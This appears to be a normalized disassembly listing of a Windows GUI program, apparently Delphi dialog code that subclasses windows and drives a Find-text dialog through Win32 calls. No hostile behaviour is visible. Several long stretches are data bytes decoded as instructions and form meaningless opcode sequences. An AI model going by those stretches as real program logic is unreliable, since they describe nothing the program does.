mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_42e060
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_42e17c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420714
mov [ esi + 0x30 ] 0x1
push esi
push sub_42e258
call sub_4217b8
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_42e1c4
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420760
test bl bl
jle r-xdata
call sub_421850
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_42e1f8
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_462cd8
mov cl 0x1
sub_42e220
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_403484
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42e258
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42e282
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e2f0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_459628
mov [ ebp - 0x14 ] eax
call sub_459544
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42e3b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4625c8
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_42e385
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e38c
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_462624
retn
sub_42e38c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e3ba
mov eax [ ebp - 0x14 ]
call sub_4596dc
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_45954c
retn
sub_42e539
inc ebx
add [ ebx ] cl
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ eax - 0xd74a9ad ] dl
mov ebx eax
mov edx esi
mov eax ebx
call sub_44622c
mov [ esi + 0x4 ] 0x90000000
mov eax [ ebx + 0x20c ]
mov [ esi + 0x1c ] eax
pop esi
pop ebx
retn
sub_42e56c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_446db4
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0xb021
je r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
and eax 0x7f
mov [ ebx + 0xc ] eax
sub_42e5b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetPropA
push eax
call CallWindowProcA
pop ebp
retn
sub_42e5ec
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
sub eax 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463a34
cmp eax [ ebp + 0x8 ]
jne r-xdata
sub eax 0x80
je r-xdata
push ebp
call sub_42e5b0
pop ecx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_463a58
jmp r-xdata
push ebp
call sub_42e5b0
pop ecx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call RemovePropA
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463a34
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463a34
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_463a58
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
call sub_463a58
jmp r-xdata
sub_42e6a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
call sub_42e114
cmp esi 0x110
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov esi [ edi + 0x1c ]
mov eax esi
call sub_42e960
inc eax
jne r-xdata
push 0x15
push 0x0
push 0x0
mov eax esi
call sub_42e9ac
push eax
mov eax esi
call sub_42e960
push eax
push 0x0
push ebx
call SetWindowPos
mov eax esi
call sub_42e9ac
inc eax
je r-xdata
push 0xfffffffc
push ebx
call GetWindowLongA
push eax
movzx eax [ rw-data ]
push eax
push ebx
call SetPropA
push sub_42e5ec
push 0xfffffffc
push ebx
call SetWindowLongA
mov eax 0x1
sub_42e728
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42e17c
mov ax [ r-xdata ]
mov [ ebx + 0x58 ] ax
mov [ ebx + 0x5a ] 0xffffffff
mov [ ebx + 0x5e ] 0xffffffff
lea eax [ ebx + 0x84 ]
mov [ eax ] 0x28
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x30 ]
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
mov [ eax + 0x8 ] edx
lea edx [ ebx + 0xac ]
mov [ eax + 0x10 ] edx
mov [ eax + 0x18 ] 0x100
lea edx [ ebx + 0x1ac ]
mov [ eax + 0x14 ] edx
mov [ eax + 0x1a ] 0x100
mov [ eax + 0x1c ] ebx
mov [ eax + 0x20 ] sub_42e6a0
mov eax FindTextA
mov [ ebx + 0x64 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_42e7d2
add [ eax ] al
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x10
push eax
call SendMessageA
lea eax [ esi + 0x68 ]
call sub_40d524
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42e1c4
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x208 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_42e828
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_43fa98
mov ebx eax
or edi 0xffffffff
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
xor edi edi
sub_42e864
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov [ ebx + 0x90 ] 0x100
mov [ ebx + 0xa4 ] sub_42e6a0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4450cc
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0x208 ] ebx
lea eax [ esi + 0x20c ]
push eax
push sub_42e828
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ ebx + 0x68 ]
call sub_4493d8
mov [ ebx + 0x88 ] eax
xor eax eax
mov esi rw-data
push eax
call BringWindowToTop
mov al 0x1
pop esi
pop ebx
retn
jae r-xdata
and edx 0x7f
bt [ ebx + 0x58 ] edx
inc eax
add esi 0x4
cmp al 0xd
jne r-xdata
mov edx [ esi ]
or [ ebx + 0x90 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov [ rw-data ] ebx
lea eax [ ebx + 0x84 ]
push eax
call [ ebx + 0x64 ]
mov esi eax
mov [ ebx + 0x80 ] esi
test esi esi
setne al
pop esi
pop ebx
retn
or [ ebx + 0x90 ] 0x200
mov eax [ ebx + 0x44 ]
mov [ ebx + 0xa8 ] eax
sub_42e978
push ebx
add esp 0xfffffff0
mov ebx edx
mov edx [ eax + 0x5a ]
mov [ ebx ] edx
mov edx [ eax + 0x5e ]
mov [ ebx + 0x4 ] edx
mov edx [ eax + 0x80 ]
test edx edx
je r-xdata
add esp 0x10
pop ebx
retn
push esp
push edx
call GetWindowRect
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
sub_42e9c4
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_42e1f8
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
cmp edx [ rw-data ]
jne r-xdata
mov edx [ ebx + 0x8 ]
lea ecx [ edi + 0x84 ]
cmp edx ecx
jne r-xdata
mov ax [ r-xdata ]
mov [ edi + 0x58 ] ax
xor ebx ebx
mov esi rw-data
inc ebx
add esi 0x4
cmp bl 0xd
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
mov eax [ edi + 0x90 ]
and eax [ esi ]
je r-xdata
mov eax [ edi + 0x90 ]
test al 0x8
je r-xdata
and eax 0x7f
bts [ edi + 0x58 ] eax
test al 0x30
je r-xdata
mov eax edi
mov si 0xffed
call sub_403430
jmp r-xdata
test al 0x40
je r-xdata
mov eax edi
mov si 0xffec
call sub_403430
jmp r-xdata
mov al 0x1
push esp
mov eax [ edi + 0x80 ]
push eax
call GetWindowRect
mov eax [ esp ]
mov [ edi + 0x5a ] eax
mov eax [ esp + 0x4 ]
mov [ edi + 0x5e ] eax
xor eax eax
mov [ edi + 0x80 ] eax
push 0x0
push 0x0
push 0xb021
mov eax [ edi + 0x68 ]
call sub_4493d8
push eax
call PostMessageA
xor eax eax
mov [ edi + 0x68 ] eax
sub_42eabc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4044c8
mov edx eax
lea eax [ ebx + 0xac ]
mov ecx 0xff
call sub_4089f8
pop esi
pop ebx
retn
sub_42eb84
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408fdc
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42ed34
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d58
call sub_42eb84
mov eax [ r-xdata ]
call sub_419ca4
mov eax [ r-xdata ]
call sub_419d44
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419cf0
sub_43006a
dec [ eax ]
sub al [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
add eax 0x6d657449
jae r-xdata
add [ eax + 0x1 ] al
fld [ ebx ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
outsb
je r-xdata
add bh bh
mov [ eax + 0x44 ] ss
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0019 ] al
outsd
outsb
jae r-xdata
add [ eax - 0x80000000 ] al
and [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500b00
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
jb r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ esi ] cl
outsb
je r-xdata
sub eax 0x10044
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
push eax
popad
jb r-xdata
js r-xdata
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add ah dh
xchg ebp eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
fsubr [ edx ]
inc esp
add [ esp + ecx * 2 ] dh
inc esp
add [ eax ] al
add [ eax ] al
jo r-xdata
adc [ eax ] al
0x2cff0000 0x442d
push eax
popad
jb r-xdata
push cs
je r-xdata
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
jl r-xdata
outsb
je r-xdata
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
loopne r-xdata
push eax
outsd
jo r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ esi + edx * 4 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
in al 0x2c
inc esp
add [ ecx ] al
add [ eax ] al
sbb al 0x0
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xchg ebp eax
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
test eax 0x48ff0001
xchg ebp eax
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
mov eax 0xbc0044a5
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push 0xc800417a
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
adc [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
dec [ eax ]
sub eax 0x2cd00044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080021 ] al
push 0x6948776f
outsb
je r-xdata
sbb al 0x45
add [ eax + eax ] bh
push [ eax + 0x2b ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090020 ] al
add [ eax ] al
add [ esp + eax + 0x49c0043 ] dl
je r-xdata
push ebx
je r-xdata
push 0xc000417a
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
loopne r-xdata
push edi
add [ eax ] al
je r-xdata
fadd [ ebx ]
add [ eax + 0x6400420e ] bh
sub eax [ ebx ]
cmp al 0x3b
test [ ebx ] cl
inc edx
add [ ebx + ecx + 0x42 ] bh
inc ebx
add [ ecx ] al
add bh al
inc ebx
add [ eax + 0x70000001 ] dl
dec esp
loop r-xdata
add al bl
pop es
inc edx
add [ eax - 0x33ffbfcc ] dl
aas
inc esp
add ah cl
xor [ eax ] eax
call 0x5c43442e
cmpsb [ esi ] [ edi ]
inc esp
inc eax
jb r-xdata
push ebx
je r-xdata
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
dec edi
add al ch
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
add [ esp + ecx * 2 + 0x40a40044 ] ch
inc esp
add [ edx + ebp * 4 + 0x41 ] ah
add ah dh
nop
inc ebx
add ah bl
add [ esi + 0x44 ] bl
inc esp
hlt
inc esp
jb r-xdata
jpe r-xdata
jpe r-xdata
jo r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
or eax [ edx ]
jl r-xdata
add al 0x43
add [ esp + eax + 0x1900043 ] bl
add [ eax ] al
jo r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002e ] al
outsb
xchg edx eax
inc ebx
add ah dh
pop ds
inc esp
add [ eax - 0x4fffbbd7 ] ah
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
lea eax [ bx + si ]
add [ ebx + eax * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
outsd
arpl [ ebx + 0x68 ] bp
loopne r-xdata
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
outsb
inc ebp
js r-xdata
add al cl
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add al al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x68656c62
jpe r-xdata
fild [ ebx ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
loopne r-xdata
cmp eax [ eax + eax + 0x8 ]
cmp al 0x44
add ah bh
push ds
inc esp
add [ eax + 0x26 ] al
inc esp
add [ ebp + 0x2ecc0044 ] ah
inc esp
add [ esi + ebx + 0x44 ] al
add [ eax + 0x1e ] cl
inc esp
add [ esi + ecx * 2 + 0x44 ] al
add [ eax + 0x4e ] dh
inc esp
add ah bh
xchg ecx eax
inc ebx
add al al
pop ds
inc esp
add [ ebx + ebp ] dl
inc esp
add [ edx + ebp + 0x2da00044 ] cl
inc esp
add [ esp + ebp + 0x44 ] cl
add [ eax ] bh
inc esp
add ah dh
dec esi
inc esp
add [ eax + esi + 0x31000044 ] cl
inc esp
add [ ecx + 0x44 ] dh
add al ah
xor [ eax + eax - 0x8 ] al
pop [ ebx ]
je r-xdata
cmp eax [ eax + eax + 0x38 ]
inc edx
inc esp
add [ eax ] bh
inc edx
add [ ebx + ebp + 0x43 ] ah
add [ ebx + edi ] bh
inc ebx
add [ eax - 0x77ffbdf2 ] bl
xor al 0x40
add [ eax + 0x4f07002b ] al
add [ eax ] al
jbe r-xdata
dec edi
popad
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x50 ] bp
sub_430d45
add [ ebx + 0x1 ] ah
add bh bh
in al dx
mov al [ 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax + 0x42080013 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xcc65646f
jl r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
insb
add [ edx + eax ] cl
add bh bh
add [ ebp + 0x10043 ] dl
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
jmp r-xdata
inc esp
jb r-xdata
fld [ ebx ]
je r-xdata
or eax [ ebx + 0x6f ]
jb r-xdata
je r-xdata
add [ eax ] al
inc ebx
jne r-xdata
outsb
jae r-xdata
add bh bh
mov [ eax + 0x44 ] ss
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
add [ eax + 0x4509001c ] al
imul esi [ fs : esp + ecx * 2 + 0x61 ] 0x6c6562
adc [ eax ] al
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
test al 0x4
jb r-xdata
outsd
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
je r-xdata
inc ebx
push 0x61437261
jae r-xdata
jb r-xdata
add [ eax ] al
jae r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x18ff0001 ] ah
xchg ebp eax
inc esp
add [ edx * 4 + 0x44 ] bh
add [ eax - 0x80000000 ] al
sbb [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
dec eax
push esp
inc ebx
add [ ebx ] dl
add al [ eax ]
jmp [ edx * 4 + 0x10043 ]
inc esp
js r-xdata
sbb eax 0x700042
add bh bh
pop eax
sub eax 0x2d740044
inc esp
add [ eax ] al
add [ eax ] al
add [ 0x16ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
insb
int3
jns r-xdata
push eax
jb r-xdata
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
inc ebx
add [ eax ] ah
add al [ eax ]
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
test al 0x4
xor eax [ eax + edi * 2 - 0x2b ]
push ebx
add [ edi ] bl
add bh bh
jo r-xdata
add [ eax ] al
add [ edx ] bl
add [ eax ] cl
inc esp
jb r-xdata
fadd [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
add dh bh
fsubr [ esp + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ 0x6e450700 ] bl
popad
bound ebp [ ebp + 0x64 ]
or al 0x22
inc edx
add [ eax ] ch
add bh bh
lodsb [ esi ]
sub al 0x44
add [ esp + ebp + 0x44 ] bh
add [ eax - 0x80000000 ] al
push ds
add [ esi + eax * 2 ] al
outsd
outsb
je r-xdata
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
adc [ eax ] al
adc [ edx ] eax
add bh bh
cmp [ ebp + 0x10043 ] dl
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
pop ds
add [ 0x65646948 ] cl
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
nop
0x1840043 0xff00
sub_4314c0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423f90
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_424718
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_423f90
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_424718
pop ebx
mov esp ebp
pop ebp
retn
sub_431584
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_42409c
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_4314c0
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_4315e4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44a600
